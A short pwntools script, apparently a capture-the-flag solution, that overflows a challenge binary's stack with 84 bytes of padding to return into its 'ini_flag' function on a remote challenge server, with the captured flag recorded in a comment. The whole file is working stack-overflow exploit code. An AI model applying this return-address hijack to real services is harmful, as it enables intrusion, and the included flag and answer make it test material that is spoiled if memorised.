from pwn import *
elf = context.binary = ELF("./chall")
# p = process()
p = remote("116.254.117.234",5202)
offset = 84
ini_flag = p32(elf.sym['ini_flag'])
payload = b"A" * offset + ini_flag + p32(0xdeadbeef)
p.sendline(payload)
# print(p.recvall().strip().decode())
p.interactive()
# flag = STEMBACTF{ret2win_k4t4_K3t4_Muti4r4}